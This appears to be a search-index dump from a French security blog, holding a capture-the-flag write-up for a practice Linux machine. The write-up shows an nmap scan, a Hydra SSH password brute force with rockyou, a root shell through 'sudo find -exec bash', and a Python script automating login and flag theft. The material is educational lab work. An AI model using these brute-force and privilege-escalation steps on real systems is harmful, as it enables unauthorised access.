[{"content":"Description Données Mode Normal Reconnaissance Analyse des ports Mode rapidité ","date":"2023-10-03T00:00:00Z","image":"/fr/p/battlehack_chirucahua/images/welcome_cover_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_120x120_fill_q75_box_smart1.jpg","permalink":"/fr/p/battlehack_chirucahua/","title":"[Facile - Linux] Chirucahua"},{"content":"","date":"2023-10-03T00:00:00Z","image":"/fr/p/htb_twomillion/images/welcome_cover_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_120x120_fill_q75_box_smart1.jpg","permalink":"/fr/p/htb_twomillion/","title":"[Linux - Facile] TwoMillion"},{"content":"Description Welcome to the BattleH4cK platform. In this first mission, your instructor will guide you step by step to give you a glimpse of the game\u0026hellip; To enter the competition, you will have to demonstrate your skills. Can you connect yourself to this machine? It should be easy, but we are nice, so here are the information we know about it: The username should be seela The password used is weak\nDonnées En lisant la description de la mission, nous apprenons que nous pouvons nous connecter à la machine en sachant que :\nL\u0026rsquo;utilisateur devrait être seela Le mot de passe utilisé est faible L\u0026rsquo;adresse IP est : 10.42.20.52 Mode normal Analyse des ports Tout d\u0026rsquo;abord, nous devons connaître quels services sont ouverts sur la machine. Pour cela, nous allons utiliser l\u0026rsquo;outil nmap :\n1 └─$ nmap 10.42.20.52 --script=default -sV Options explained:\nOption Description \u0026ndash;script=default Permet de lancer un scan qui utilise un pannel de scripts. -sV Détection de version 1 2 3 4 5 6 7 8 9 10 Nmap scan report for 10.42.20.52 Host is up (0.064s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fe:c2:f2:9c:8f:17:5d:66:9a:90:c9:e9:b3:1a:0a:bc (RSA) | 256 ea:73:61:43:b8:7d:db:88:2b:d7:a8:16:39:49:b6:40 (ECDSA) |_ 256 be:5e:54:f8:6d:3c:de:7d:53:17:99:08:65:0c:34:a0 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds Nous pouvons observer la présence du port 22 qui correspond au service SSH. En nous rappelant des données initiales, nous savons que :\nL\u0026rsquo;utilisateur devrait être seela Le mot de passe utilisé est faible Avons de continuer, jetons un oeil aux verbes utilisés : Il y a : \u0026ldquo;devrait\u0026rdquo; et \u0026ldquo;utilisé\u0026rdquo;. Quand nous regardons la phrase à propos du mot de passe, nous observons le mot \u0026ldquo;utilisé\u0026rdquo; qui peut paraitre un peu confus.\nAvant de poursuivre, examinons les verbes utilisés. Il y a \u0026ldquo;devrait\u0026rdquo; et \u0026ldquo;utilisé\u0026rdquo;. Dans la phrase sur le mot de passe, le mot \u0026ldquo;utilisé\u0026rdquo; est un peu déroutant. Il y a deux possibilités d\u0026rsquo;interprétation :\nfaible est le mot de passe le mot de passe est faible, c\u0026rsquo;est-à-dire qu\u0026rsquo;il est trop facile à deviner Pour savoir si le mot de passe est égal à faible, nous devons essayer de nous connecter avec lui et avec le nom d\u0026rsquo;utilisateur seela. (Le nom d\u0026rsquo;utilisateur n\u0026rsquo;est pas si déroutant, car il ne signifie rien).\nPour nous connecter à la machine en utilisant nos données, nous pouvons utiliser ssh :\n1 2 3 4 └─$ ssh seela@10.42.20.52 seela@10.42.20.54\u0026#39;s password: weak Permission denied, please try again. Sachant que nous sommes refusé, nous pouvons comprendre que notre mot de passe n\u0026rsquo;est pas égal à \u0026ldquo;faible\u0026rdquo; mais qu\u0026rsquo;il est faible, c\u0026rsquo;est-à-dire facile à deviner.\nBruteforcer le mot de passe de seela Pour trouver le mot de passe utilisé par seela, comme le dit Google, nous pouvons utiliser une attaque appelée \u0026ldquo;bruteforce\u0026rdquo;. Dans le premier lien, nous pouvons voir qu\u0026rsquo;il existe un outil appelé \u0026ldquo;Hydra\u0026rdquo; qui peut nous aider dans cette situation. Nous pouvons constater qu\u0026rsquo;il existe un outil appelé \u0026ldquo;Hydra\u0026rdquo; qui peut nous aider dans cette situation. Le site web nous dit que nous avons besoin d\u0026rsquo;un nom d\u0026rsquo;utilisateur et d\u0026rsquo;une liste de mots. Pour savoir quelle liste de mots nous devrions utiliser, nous pouvons essayer de demander à Google quelle liste pourrait être utile. En regardant le premier lien, nous pouvons lire que la liste de mots rockyou peut être bonne à essayer. Si vous possédez Kali Linux, rockyou se trouve dans /usr/share/wordlist/rockyou.txt.gz (vous pouvez aussi taper la commande : wordlists).\nPour l\u0026rsquo;instant, rockyou est gzipé, pour l\u0026rsquo;extraire, on peut utiliser gunzip, en faisant :\n1 └─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz Maintenant que nous avons une liste de mots, lançons Hydra !\n1 └─$ hydra -l seela -P /usr/share/wordlists/rockyou.txt ssh://10.42.20.52 -t 4 Options explained:\nOption Description -l NOM_UTILISATEUR ou -L FICHIER login avec le NOM_UTILISATEUR, ou charger plusieurs logins à partir de FICHIER -P FICHIER ou -P FICHIER essayer le mot de passe PASS, ou charger plusieurs mots de passe à partir de FICHIER -t TACHES Lance TACHES nombre de connexions en parallèle (par défaut : 16) 1 2 3 4 5 Hydra v9.3 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://10.42.20.54:22/ [22][ssh] host: 10.42.20.54 login: seela password: rockyou 1 of 1 target successfully completed, 1 valid password found Nous avons obtenu notre mot de passe, ce qui est rockyou !\nEssayons de nous connecter à la machine de la même manière qu\u0026rsquo;avant :\n1 2 └─$ ssh seela@10.42.20.52 seela@10.42.20.54\u0026#39;s password: rockyou Resultat :\n1 2 3 4 5 6 7 8 9 Linux welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw 5.15.0-39-generic #42-Ubuntu SMP Thu Jun 9 23:42:32 UTC 2022 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ Comme on peut le voir, nous sommes maintenant connectés ! Le premier drapeau est dans le répertoire dans lequel nous nous trouvons :\n1 seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ ls -l Options explained:\nOption Description -l utiliser un format de liste long Resultat :\n1 2 total 4 -rw-r--r-- 1 root root 17 Feb 5 20:23 user.txt Récupérons le contenu du drapeau user.txt.\n1 └─$ cat user.txt Resultat :\n1 FLAG{someCharacters} Elevation de privilèges 1 2 3 4 5 6 7 8 9 seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for seela: rockyou Options Explained:\nOption Description -l Liste les commandes autorisées (et interdites) pour l\u0026rsquo;utilisateur qui les invoque sur l\u0026rsquo;hôte actuel. 1 2 3 4 5 Matching Defaults entries for seela on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User seela may run the following commands on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw: (root) /usr/bin/find * Comme nous pouvons le voir, en utilisant sudo, nous pouvons lancer la commande find avec n\u0026rsquo;importe quel paramètre, en tant qu\u0026rsquo;utilisateur root. Initialement, find est utilisé pour trouver des choses sur le système. Mais, lorsque nous jetons un coup d\u0026rsquo;oeil à son manuel, nous pouvons utiliser de nombreuses options.\nPour l\u0026rsquo;instant, nous aimerions devenir root ou lire le drapeau /root/root.txt. Pour ce faire, nous allons chercher des options qui peuvent faire l\u0026rsquo;une de ces choses.\nUne fois que nous avons lu le manuel, nous pouvons parler d\u0026rsquo;une option : -exec.\nL\u0026rsquo;option -exec nous permettra d\u0026rsquo;exécuter une commande lorsqu\u0026rsquo;un fichier recherché est trouvé. Ici, nous aimerions lire le contenu de /root/root.txt.\nPour ce faire, nous pouvons exécuter la commande suivante :\n1 sudo find /root/root.txt -exec cat {} \\ ; Ce qui nous donne le drapeau final.\nSi nous le souhaitons, nous pouvons également obtenir un shell root, en utilisant la commande suivante :\n1 sudo find / -exec bash {} \\; Mode rapidité Dans ce mode, notre objectif est de résoudre la machine le plus rapidement possible. Pour cela, j\u0026rsquo;ai créé un script python (qui n\u0026rsquo;est pas nécessairement le langage le plus rapide) qui automatise nos différentes actions de résolution.\nLe script de lancement de machine et de validation des drapeaux n\u0026rsquo;est pas donné. Seul le script de résolution de machine sera donné.\nTout d\u0026rsquo;abord, il nous faut noter le processus de résolution de la machine. Dans un premier temps, nous avons cherché le mot de passe de l\u0026rsquo;utilisateur seela. Ensuite, nous nous sommes connecté sur le serveur distant en SSH grâce aux identifiants obtenus et avons récupéré notre premier drapeau. Une fois connecté, nous avons observé les droits de l\u0026rsquo;utilisateur seela afin de découvrir qu\u0026rsquo;il peut lancer la commande find en tant que root. Nous avons terminé, la machine en affichant le contenu du drapeau /root/root.txt.\nL\u0026rsquo;objectif de cette partie est d\u0026rsquo;extraire de notre processus initial les étapes nécessaires à la résolution de la machine.\nPrise de raccourcis Dans cette partie, nous listons les divers raccourcis pris pour gagner un maximum de temps :\naprès relancement de la machine, nous observons que le mot de passe reste le même. Ainsi, nous n\u0026rsquo;aurons pas besoin de réaliser à nouveau l\u0026rsquo;étape de bruteforce. au lieu de chercher les deux drapeaux séparéments, nous pouvons utiliser une seule commande. Recherche de modules Afin de pouvoir accéder au service SSH de la machine, deux modules ont été sélectionnés :\nparamiko : l\u0026rsquo;une des bibliothèques les plus connues pour ce qui est de se connecter à distance à un autre ordinateur à l\u0026rsquo;aide de SSHv2\nssh2-python : bibliothèque de connexion à distance via SSHv2 qui se dit \u0026ldquo;très rapide\u0026rdquo;\nLe choix de ces deux modules a été vu dans un aspect comparatif. Un script pour chaque module a été mis en place. Pour ma part, j\u0026rsquo;ai trouvé le module ssh2-python plus rapide que paramiko.\nScript utilisé Ainsi, un script de résolution a été conçu avec l\u0026rsquo;aide du module ssh2-python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from ssh2.session import Session # ssh2-python import socket import hbrunner # Module personnalisé de lancement des machines et envois des drapeaux # Lancement de la machine Welcome en mode \u0026#34;rapidité\u0026#34; bot = hbrunner.Runner(\u0026#34;welcome\u0026#34;, \u0026#34;speedrun\u0026#34;, \u0026#34;vpn\u0026#34;) # Obtention de l\u0026#39;adresse IP ipAddress = bot.getIpAddress()[0] sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((ipAddress, 22)) session = Session() session.handshake(sock) # identifiants SSH session.userauth_password(\u0026#34;seela\u0026#34;,\u0026#34;rockyou\u0026#34;) channel = session.open_session() # Envoi du mot de passe sudo demandé, puis lecture des deux drapeaux channel.execute(\u0026#34;echo rockyou|sudo -S find /home/seela/user.txt /root/root.txt -exec cat {} \\;\u0026#34;) size,data=channel.read() while size \u0026gt; 0: # Envoi du drapeau à la plateforme bot.sendFlag(data.decode()) size,data=channel.read() Score temps Cela m\u0026rsquo;a permis d\u0026rsquo;atteindre un temps de résolution de moins d'1 seconde (~0.7s).\n","date":"2023-10-03T00:00:00Z","image":"/fr/p/battlehack_welcome/images/welcome_cover_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_120x120_fill_q75_box_smart1.jpg","permalink":"/fr/p/battlehack_welcome/","title":"Bruteforce SSH \u0026 Exploitation de Sudo find"}]